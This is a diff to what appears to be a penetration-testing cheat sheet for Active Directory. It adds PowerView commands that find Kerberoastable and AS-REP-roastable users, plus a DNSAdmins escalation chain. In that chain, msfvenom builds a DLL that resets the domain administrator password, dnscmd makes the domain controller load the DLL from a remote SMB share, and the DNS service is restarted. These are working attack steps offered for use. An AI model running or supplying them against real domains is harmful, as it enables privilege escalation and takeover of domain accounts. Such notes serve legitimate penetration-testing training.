@@ -206,7 +206,17 @@ $("$env:UserDomain\$env:Username")) {$_}}
 
 ### Kerberoasting
 
+**Enumerate kerberoastable user**
+```powershell
+Get-DomainUser -SPN | select name,serviceprincipalname
+```
+
 ### ASREPRoasting
+
+**Enumerate asreproastable user**
+```powershell
+Get-DomainUser -PreauthNotRequired | select name
+```
 
 ### DNSAdmin
 
@@ -243,7 +253,21 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	return TRUE;
 }
 ```
+you can also create a dll file using msfvenom : `msfvenom -p windows/x64/exec cmd='net user administrator aked /domain' -
+f dll > evil.dll`
+it'll execute `net user administrator aked /domain` with SYSTEM privileges
 
+set the remote DLL path into the Windows Registry
+```powershell
+dnscmd dc01 /config /serverlevelplugindll \\10.10.14.33\share\evil.dll
+```
+`\\10.10.14.33\share\evil.dll` : SMB Share.
+
+**restart DNS service**
+```powershell
+sc.exe stop dns
+sc.exe start dns
+```
 
 ## Lateral Mouvement
 
